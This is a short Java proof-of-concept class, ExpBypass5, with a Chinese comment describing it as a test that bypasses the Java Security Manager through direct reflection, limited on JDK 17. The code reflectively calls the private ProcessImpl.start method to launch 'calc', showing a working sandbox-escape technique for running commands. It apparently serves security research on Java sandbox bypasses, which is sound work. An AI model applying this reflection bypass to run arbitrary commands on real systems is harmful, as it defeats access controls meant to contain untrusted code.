/*
测试2：直接反射调用，可以绕过Java Security Manager，但是受到jdk17限制
*/
package zk_backup_0.configs.conf1;

import java.lang.reflect.Method;
import java.util.Map;

public class ExpBypass5 {

    public static void main(String[] args) throws Exception{
        Class clz = Class.forName("java.lang.ProcessImpl");
        Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        method.invoke(clz, new String[]{"calc"}, null, null, null, false);
    }
}
